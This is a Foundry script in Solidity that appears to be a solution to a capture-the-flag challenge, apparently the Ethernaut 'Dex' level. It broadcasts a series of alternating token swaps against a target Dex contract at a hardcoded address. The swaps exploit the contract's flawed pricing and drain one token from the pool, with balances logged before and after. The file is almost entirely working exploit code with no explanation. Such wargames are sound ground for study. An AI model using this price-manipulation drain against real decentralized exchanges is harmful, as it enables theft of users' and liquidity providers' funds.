pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/dex.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract dexSolution  is Script{
    Dex dex = Dex(0x8B38c2eFEF101250826673F3065d87f47aD8aD5a);
    address player = 0xeDc3e3588a5F0bf61c9A6B4ad1e573942d729e16;
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(
            IERC20(dex.token1()).balanceOf(address(dex)),
            IERC20(dex.token2()).balanceOf(address(dex))
        );
        console.log(
            dex.balanceOf(dex.token1(), player),
            dex.balanceOf(dex.token2(), player)
        );
        dex.approve(address(dex), 1000);
        address token1 = dex.token1();
        address token2 = dex.token2();
        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);

        console.log(
            IERC20(dex.token1()).balanceOf(address(dex)),
            IERC20(dex.token2()).balanceOf(address(dex))
        );
        console.log(
            dex.balanceOf(dex.token1(), player),
            dex.balanceOf(dex.token2(), player)
        );
        vm.stopBroadcast();
    }
}
